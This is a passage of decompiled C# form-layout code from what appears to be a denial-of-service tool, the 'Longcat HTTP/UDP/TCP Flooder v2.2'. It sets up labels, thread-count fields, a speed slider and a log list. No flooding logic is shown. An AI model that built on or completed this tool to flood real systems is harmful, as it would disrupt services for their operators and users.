		((Control)label8).set_TabIndex(16);
		((Control)label8).set_Text("UDP/TCP Threads");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(371, 749));
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)chkShowSpam);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)trackSpeed);
		((Control)this).get_Controls().Add((Control)(object)lstLog);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)groupBox2);
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("frmMain");
		((Control)this).set_Text("Longcat HTTP/UDP/TCP Flooder v2.2");
		((Form)this).add_Load((EventHandler)frmMain_Load);
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((Control)groupBox2).ResumeLayout(false);
		((Control)groupBox2).PerformLayout();
		((ISupportInitialize)trackSpeed).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
